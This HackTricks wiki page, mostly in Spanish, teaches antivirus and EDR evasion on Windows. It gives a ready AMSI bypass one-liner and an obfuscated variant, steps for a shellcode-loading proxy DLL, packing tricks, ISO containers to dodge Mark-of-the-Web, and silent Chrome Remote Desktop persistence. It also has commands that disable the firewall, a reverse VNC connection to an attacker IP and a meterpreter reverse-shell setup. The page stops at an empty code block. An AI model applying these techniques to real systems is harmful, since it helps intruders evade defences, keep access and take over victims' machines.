# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Esta página fue escrita por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Una herramienta para detener Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Una herramienta para detener Windows Defender simulando otro AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Actualmente, los AVs usan diferentes métodos para comprobar si un fichero es malicioso o no: static detection, dynamic analysis, y para los EDRs más avanzados, behavioural analysis.

### **Static detection**

Static detection se consigue marcando cadenas conocidas maliciosas o arrays de bytes en un binario o script, y también extrayendo información del propio fichero (p. ej. file description, company name, digital signatures, icon, checksum, etc.). Esto significa que usar herramientas públicas conocidas puede hacer que te detecten más fácilmente, ya que probablemente ya han sido analizadas y marcadas como maliciosas. Hay un par de maneras de esquivar este tipo de detección:

- **Encryption**

Si encriptas el binario, no habrá forma de que el AV detecte tu programa, pero necesitarás algún tipo de loader para desencriptar y ejecutar el programa en memoria.

- **Obfuscation**

A veces lo único que necesitas es cambiar algunas cadenas en tu binario o script para pasarlo por alto, pero esto puede ser una tarea que consuma mucho tiempo dependiendo de lo que intentes ofuscar.

- **Custom tooling**

Si desarrollas tus propias herramientas, no habrá firmas malas conocidas, pero esto requiere mucho tiempo y esfuerzo.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

Te recomiendo revisar esta [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre AV Evasion práctico.

### **Dynamic analysis**

Dynamic analysis es cuando el AV ejecuta tu binario en un sandbox y vigila actividad maliciosa (p. ej. intentar desencriptar y leer las contraseñas del navegador, realizar un minidump de LSASS, etc.). Esta parte puede ser un poco más complicada de manejar, pero aquí tienes algunas cosas que puedes hacer para evadir sandboxes.

- **Sleep before execution** Dependiendo de cómo esté implementado, puede ser una gran forma de evadir el dynamic analysis del AV. Los AVs tienen muy poco tiempo para escanear ficheros para no interrumpir el flujo de trabajo del usuario, así que usar sleeps largos puede perturbar el análisis de binarios. El problema es que muchos sandboxes de AV pueden simplemente saltarse el sleep dependiendo de cómo esté implementado.
- **Checking machine's resources** Normalmente los Sandboxes tienen muy pocos recursos para trabajar (p. ej. < 2GB RAM), de lo contrario podrían ralentizar la máquina del usuario. También puedes ser muy creativo aquí, por ejemplo comprobando la temperatura de la CPU o incluso las velocidades del ventilador; no todo estará implementado en el sandbox.
- **Machine-specific checks** Si quieres dirigirte a un usuario cuya estación de trabajo está unida al dominio "contoso.local", puedes comprobar el dominio del equipo para ver si coincide con el que has especificado; si no coincide, puedes hacer que tu programa termine.

Resulta que el nombre del equipo del Sandbox de Microsoft Defender es HAL9TH, así que puedes comprobar el nombre del equipo en tu malware antes de la detonación; si el nombre coincide con HAL9TH, significa que estás dentro del sandbox de Defender, por lo que puedes hacer que tu programa salga.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fuente: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Algunos otros consejos muy buenos de [@mgeeky](https://twitter.com/mariuszbit) para enfrentarse a Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Como hemos dicho antes en este post, **public tools** eventualmente **get detected**, así que deberías hacerte una pregunta:

Por ejemplo, si quieres volcar LSASS, ¿**do you really need to use mimikatz**? ¿O podrías usar un proyecto diferente que sea menos conocido y que también vuelque LSASS?

La respuesta correcta probablemente sea la segunda. Tomando mimikatz como ejemplo, probablemente sea uno de los, si no el más, detectados por AVs y EDRs; aunque el proyecto en sí es muy bueno, también es una pesadilla para trabajar con él si quieres eludir AVs, así que simplemente busca alternativas para lo que intentas lograr.

> [!TIP]
> Cuando modifiques tus payloads para evadir detección, asegúrate de **turn off automatic sample submission** en defender, y por favor, en serio, **DO NOT UPLOAD TO VIRUSTOTAL** si tu objetivo es lograr evasión a largo plazo. Si quieres comprobar si tu payload es detectado por un AV en particular, instálalo en una VM, intenta desactivar el envío automático de muestras y pruébalo ahí hasta que estés satisfecho con el resultado.

## EXEs vs DLLs

Siempre que sea posible, prioriza usar DLLs para evadir detección; en mi experiencia, los ficheros DLL suelen estar **mucho menos detectados** y analizados, así que es un truco muy simple para evitar la detección en algunos casos (si tu payload tiene alguna forma de ejecutarse como DLL, claro).

Como podemos ver en esta imagen, un DLL Payload de Havoc tiene una tasa de detección de 4/26 en antiscan.me, mientras que el payload EXE tiene una tasa de detección de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Ahora mostraremos algunos trucos que puedes usar con ficheros DLL para ser mucho más sigiloso.

## DLL Sideloading & Proxying

**DLL Sideloading** aprovecha el DLL search order que usa el loader posicionando tanto la aplicación víctima como el/los payload(s) maliciosos uno junto al otro.

Puedes checkear programas susceptibles a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) y el siguiente powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Este comando mostrará la lista de programas susceptibles a DLL hijacking dentro de "C:\Program Files\\" y los archivos DLL que intentan cargar.

Te recomiendo encarecidamente que **explores los programas DLL Hijackable/Sideloadable por ti mismo**, esta técnica es bastante sigilosa si se hace correctamente, pero si usas programas DLL Sideloadable conocidos públicamente, puedes ser detectado fácilmente.

El simple hecho de colocar un DLL malicioso con el nombre que un programa espera cargar no hará que se ejecute tu payload, ya que el programa espera funciones específicas dentro de ese DLL; para corregir este problema, usaremos otra técnica llamada **DLL Proxying/Forwarding**.

**DLL Proxying** reenvía las llamadas que un programa hace desde el DLL proxy (y malicioso) al DLL original, preservando así la funcionalidad del programa y permitiendo manejar la ejecución de tu payload.

Voy a usar el proyecto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Estos son los pasos que seguí:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
El último comando nos dará 2 archivos: una source code template de la DLL y la DLL original renombrada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Estos son los resultados:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Tanto nuestro shellcode (codificado con [SGN](https://github.com/EgeBalci/sgn)) como el proxy DLL tienen una tasa de detección 0/26 en [antiscan.me](https://antiscan.me)! Lo llamaría un éxito.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Te **recomiendo encarecidamente** que veas [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading y también [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) para aprender más sobre lo que hemos discutido con mayor profundidad.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Puedes usar Freeze para cargar y ejecutar tu shellcode de forma sigilosa.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> La evasión es solo un juego de gato y ratón; lo que funciona hoy podría detectarse mañana, así que nunca confíes en una sola herramienta; si es posible, intenta encadenar múltiples técnicas de evasión.

## AMSI (Anti-Malware Scan Interface)

AMSI fue creado para prevenir "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, los AVs solo eran capaces de escanear **files on disk**, por lo que si de algún modo podías ejecutar payloads **directly in-memory**, el AV no podía hacer nada para evitarlo, ya que no tenía suficiente visibilidad.

La característica AMSI está integrada en estos componentes de Windows.

- User Account Control, or UAC (elevación de EXE, COM, MSI, o instalación de ActiveX)
- PowerShell (scripts, uso interactivo y evaluación dinámica de código)
- Windows Script Host (wscript.exe y cscript.exe)
- JavaScript y VBScript
- Office VBA macros

Permite que las soluciones antivirus inspeccionen el comportamiento de los scripts exponiendo el contenido del script en una forma que está tanto sin encriptar como sin ofuscar.

Ejecutar `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` generará la siguiente alerta en Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Fíjate cómo antepone `amsi:` y luego la ruta al ejecutable desde el que se ejecutó el script, en este caso, powershell.exe

No dejamos ningún archivo en disco, pero aun así fuimos detectados in-memory debido a AMSI.

Además, a partir de **.NET 4.8**, el código C# también se ejecuta a través de AMSI. Esto incluso afecta a `Assembly.Load(byte[])` para cargar ejecución in-memory. Por eso se recomienda usar versiones más bajas de .NET (como 4.7.2 o inferiores) para ejecución in-memory si quieres evadir AMSI.

Hay un par de maneras de sortear AMSI:

- **Obfuscation**

Dado que AMSI funciona principalmente con detecciones estáticas, modificar los scripts que intentas cargar puede ser una buena forma de evadir la detección.

Sin embargo, AMSI tiene la capacidad de desofuscar scripts incluso si tienen múltiples capas, por lo que la ofuscación podría ser una mala opción dependiendo de cómo se haga. Esto hace que no sea tan sencillo evadirlo. Aunque, a veces, todo lo que necesitas es cambiar un par de nombres de variables y estarás bien, así que depende de cuánto haya sido marcado algo.

- **AMSI Bypass**

Dado que AMSI se implementa cargando una DLL en el proceso de powershell (también cscript.exe, wscript.exe, etc.), es posible manipularla fácilmente incluso ejecutando como un usuario sin privilegios. Debido a este fallo en la implementación de AMSI, los investigadores han encontrado múltiples formas de evadir el escaneo de AMSI.

**Forcing an Error**

Forzar la inicialización de AMSI para que falle (amsiInitFailed) dará como resultado que no se inicie ningún escaneo para el proceso actual. Originalmente esto fue divulgado por [Matt Graeber](https://twitter.com/mattifestation) y Microsoft ha desarrollado una firma para prevenir un uso más amplio.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Solo hizo falta una línea de código de powershell para dejar AMSI inutilizable para el proceso actual de powershell. Esa línea, por supuesto, fue detectada por AMSI, así que se necesita alguna modificación para poder usar esta técnica.

Aquí hay un AMSI bypass modificado que tomé de este [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Ten en cuenta que esto probablemente será detectado una vez que esta publicación salga a la luz, así que no deberías publicar ningún código si tu plan es permanecer indetectado.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Por favor lee [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para una explicación más detallada.

También existen muchas otras técnicas usadas para evadir AMSI con PowerShell; consulta [**esta página**](basic-powershell-for-pentesters/index.html#amsi-bypass) y [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para aprender más sobre ellas.

Esta herramienta [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) también genera scripts para evadir AMSI.

**Eliminar la firma detectada**

Puedes usar una herramienta como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** y **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para eliminar la firma AMSI detectada de la memoria del proceso actual. Esta herramienta funciona escaneando la memoria del proceso actual en busca de la firma AMSI y luego sobrescribiéndola con instrucciones NOP, eliminándola efectivamente de la memoria.

**Productos AV/EDR que usan AMSI**

Puedes encontrar una lista de productos AV/EDR que usan AMSI en **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usar PowerShell versión 2**
Si usas PowerShell versión 2, AMSI no se cargará, por lo que podrás ejecutar tus scripts sin ser escaneados por AMSI. Puedes hacer esto:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging es una característica que permite registrar todos los comandos de PowerShell ejecutados en un sistema. Esto puede ser útil para auditoría y resolución de problemas, pero también puede ser un **problema para los atacantes que quieren evadir la detección**.

Para evadir PowerShell logging, puedes usar las siguientes técnicas:

- **Disable PowerShell Transcription and Module Logging**: Puedes usar una herramienta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para este propósito.
- **Use Powershell version 2**: Si usas PowerShell versión 2, AMSI no se cargará, por lo que puedes ejecutar tus scripts sin ser escaneados por AMSI. Puedes hacer esto: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Usa [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para generar un powershell sin defensas (esto es lo que usa `powerpick` de Cobal Strike).


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Al analizar malware que usa ConfuserEx 2 (o forks comerciales) es habitual enfrentarse a varias capas de protección que bloquearán decompilers y sandboxes. El flujo de trabajo que sigue restaura de forma fiable **un IL casi original** que luego puede ser decompilado a C# en herramientas como dnSpy o ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  Esto también parchea el PE checksum, de modo que cualquier modificación hará que el binario falle. Usa **AntiTamperKiller** para localizar las tablas de metadata encriptadas, recuperar las claves XOR y reescribir un assembly limpio:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
La salida contiene los 6 parámetros anti-tamper (`key0-key3`, `nameHash`, `internKey`) que pueden ser útiles al construir tu propio unpacker.

2.  Symbol / control-flow recovery – alimenta el archivo *clean* a **de4dot-cex** (un fork de de4dot con soporte para ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile
• de4dot deshará el control-flow flattening, restaurará los namespaces, clases y nombres de variables originales y desencriptará las constant strings.

3.  Proxy-call stripping – ConfuserEx reemplaza llamadas directas a métodos con wrappers ligeros (a.k.a *proxy calls*) para dificultar aún más la decompilación. Elimínalas con **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Después de este paso deberías observar APIs normales de .NET como `Convert.FromBase64String` o `AES.Create()` en lugar de funciones wrapper opacas (`Class8.smethod_10`, …).

4.  Manual clean-up – ejecuta el binario resultante bajo dnSpy, busca grandes blobs Base64 o uso de `RijndaelManaged`/`TripleDESCryptoServiceProvider` para localizar el *real* payload. A menudo el malware lo almacena como un array de bytes codificado TLV inicializado dentro de `<Module>.byte_0`.

La cadena anterior restaura el flujo de ejecución **sin** necesidad de ejecutar la muestra maliciosa — útil cuando se trabaja en una estación offline.

> 🛈  ConfuserEx produce un atributo personalizado llamado `ConfusedByAttribute` que puede usarse como IOC para triage automático de muestras.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): El objetivo de este proyecto es proporcionar un fork de código abierto de la suite de compilación [LLVM](http://www.llvm.org/) capaz de aumentar la seguridad del software mediante [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) y tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demuestra cómo usar el lenguaje `C++11/14` para generar, en tiempo de compilación, código ofuscado sin usar ninguna herramienta externa y sin modificar el compilador.
- [**obfy**](https://github.com/fritzone/obfy): Añade una capa de operaciones ofuscadas generadas por el framework de metaprogramación de plantillas de C++ que hará un poco más difícil la vida de la persona que quiera crackear la aplicación.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz es un ofuscador binario x64 capaz de ofuscar varios tipos de archivos PE, incluyendo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame es un motor simple de código metamórfico para ejecutables arbitrarios.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator es un framework de obfuscación de código de grano fino para lenguajes soportados por LLVM que utiliza ROP (return-oriented programming). ROPfuscator ofusca un programa a nivel de código ensamblador transformando instrucciones regulares en cadenas ROP, frustrando nuestra concepción natural del flujo de control normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt es un .NET PE Crypter escrito en Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor es capaz de convertir EXE/DLL existentes en shellcode y luego cargarlos

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen es un mecanismo de seguridad destinado a proteger al usuario final contra la ejecución de aplicaciones potencialmente maliciosas.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funciona principalmente con un enfoque basado en reputación, lo que significa que las aplicaciones descargadas de forma poco común activarán SmartScreen, alertando y evitando que el usuario final ejecute el archivo (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) es un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) con el nombre Zone.Identifier que se crea automáticamente al descargar archivos desde internet, junto con la URL desde la que se descargó.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Verificando el ADS Zone.Identifier para un archivo descargado desde internet.</p></figcaption></figure>

> [!TIP]
> Es importante notar que los ejecutables firmados con un certificado de firma **confiable** **no activarán SmartScreen**.

Una forma muy efectiva de evitar que tus payloads obtengan la Mark of The Web es empaquetándolos dentro de algún tipo de contenedor como un ISO. Esto ocurre porque Mark-of-the-Web (MOTW) **no puede** aplicarse a volúmenes **no NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) es una herramienta que empaqueta payloads en contenedores de salida para evadir Mark-of-the-Web.

Ejemplo de uso:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) es un potente mecanismo de registro en Windows que permite a las aplicaciones y componentes del sistema **registrar eventos**. Sin embargo, también puede ser usado por productos de seguridad para monitorizar y detectar actividades maliciosas.

De manera similar a cómo AMSI es deshabilitado (evadido), también es posible hacer que la función **`EtwEventWrite`** del proceso en espacio de usuario retorne inmediatamente sin registrar eventos. Esto se consigue parcheando la función en memoria para que retorne inmediatamente, deshabilitando efectivamente el registro ETW para ese proceso.

You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Cargar binarios C# en memoria es conocido desde hace bastante tiempo y sigue siendo una excelente manera de ejecutar tus herramientas de post-explotación sin ser detectado por AV.

Dado que el payload se cargará directamente en memoria sin tocar el disco, solo tendremos que preocuparnos por parchear AMSI para todo el proceso.

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) already provide the ability to execute C# assemblies directly in memory, but there are different ways of doing so:

- **Fork\&Run**

Implica **crear un nuevo proceso sacrificial**, inyectar tu código malicioso de post-explotación en ese nuevo proceso, ejecutar tu código malicioso y, al terminar, matar el nuevo proceso. Esto tiene ventajas y desventajas. La ventaja del método fork and run es que la ejecución ocurre **fuera** de nuestro proceso implantado Beacon. Esto significa que si algo en nuestra acción de post-explotación sale mal o es detectado, hay una **probabilidad mucho mayor** de que nuestro **implant sobreviva.** La desventaja es que tienes una **mayor probabilidad** de ser detectado por **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Se trata de inyectar el código malicioso de post-explotación **en su propio proceso**. De esta manera, puedes evitar crear un nuevo proceso y que este sea escaneado por AV, pero la desventaja es que si algo sale mal con la ejecución de tu payload, hay una **probabilidad mucho mayor** de **perder tu beacon** ya que podría fallar.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Si quieres leer más sobre la carga de ensamblados C#, consulta este artículo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) y su InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

You can also load C# Assemblies **from PowerShell**, check out [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) and [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), es posible ejecutar código malicioso usando otros lenguajes dando a la máquina comprometida acceso **al entorno del intérprete instalado en una compartición SMB controlada por el atacante**.

Al permitir el acceso a los binarios del intérprete y al entorno en la compartición SMB puedes **ejecutar código arbitrario en estos lenguajes en memoria** de la máquina comprometida.

The repo indicates: Defender still scans the scripts but by utilising Go, Java, PHP etc we have **more flexibility to bypass static signatures**. Testing with random un-obfuscated reverse shell scripts in these languages has proved successful.

## TokenStomping

Token stomping es una técnica que permite a un atacante **manipular el token de acceso o un producto de seguridad como un EDR o AV**, permitiéndole reducir sus privilegios para que el proceso no muera pero no tenga permisos para comprobar actividades maliciosas.

To prevent this Windows could **prevent external processes** from getting handles over the tokens of security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Como se describe en [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), es fácil desplegar Chrome Remote Desktop en el PC de una víctima y luego usarlo para tomar control y mantener persistencia:
1. Descarga desde https://remotedesktop.google.com/, haz clic en "Set up via SSH", y luego haz clic en el archivo MSI para Windows para descargar el archivo MSI.
2. Ejecuta el instalador silenciosamente en la víctima (se requieren privilegios de administrador): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vuelve a la página de Chrome Remote Desktop y haz clic en siguiente. El asistente te pedirá autorizar; haz clic en el botón Authorize para continuar.
4. Ejecuta el parámetro dado con algunos ajustes: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Nota: el parámetro pin permite establecer el PIN sin usar la GUI).


## Advanced Evasion

La evasión es un tema muy complicado; a veces tienes que tener en cuenta muchas fuentes de telemetría en un solo sistema, por lo que es prácticamente imposible permanecer completamente indetectado en entornos maduros.

Cada entorno contra el que trabajes tendrá sus propias fortalezas y debilidades.

Te animo encarecidamente a ver esta charla de [@ATTL4S](https://twitter.com/DaniLJ94), para obtener una introducción a técnicas de Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Esta es también otra gran charla de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Puedes usar [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) que **eliminará partes del binario** hasta que **determine qué parte Defender** detecta como maliciosa y te la divida.\
Otra herramienta que hace **lo mismo es** [**avred**](https://github.com/dobin/avred) con un servicio web abierto en [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hasta Windows10, todas las versiones de Windows venían con un **servidor Telnet** que podías instalar (como administrador) haciendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Haz que se **inicie** cuando el sistema arranque y **ejecútalo** ahora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambiar telnet port** (stealth) y desactivar firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Descárgalo desde: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (busca las descargas bin, no el instalador)

**EN EL HOST**: Ejecuta _**winvnc.exe**_ y configura el servidor:

- Habilita la opción _Disable TrayIcon_
- Establece una contraseña en _VNC Password_
- Establece una contraseña en _View-Only Password_

Luego, mueve el binario _**winvnc.exe**_ y el archivo **recién** creado _**UltraVNC.ini**_ dentro del **victim**

#### **Reverse connection**

El **attacker** debería ejecutar en su **host** el binario `vncviewer.exe -listen 5900` para que esté preparado para captar una reverse **VNC connection**. Luego, dentro del **victim**: inicia el daemon winvnc `winvnc.exe -run` y ejecuta `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ADVERTENCIA:** Para mantener el sigilo debes evitar hacer lo siguiente

- No inicies `winvnc` si ya se está ejecutando o desencadenarás una [ventana emergente](https://i.imgur.com/1SROTTl.png). Comprueba si se está ejecutando con `tasklist | findstr winvnc`
- No inicies `winvnc` sin `UltraVNC.ini` en el mismo directorio o provocará que se abra [la ventana de configuración](https://i.imgur.com/rfMQWcf.png)
- No ejecutes `winvnc -h` para ayuda o desencadenarás una [ventana emergente](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Descárgalo desde: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro de GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ahora **inicia el lister** con `msfconsole -r file.rc` y **ejecuta** el **payload xml** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**El defensor actual terminará el proceso muy rápido.**

### Compilando nuestro propio reverse shell

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primer C# Revershell

Compílalo con:
```
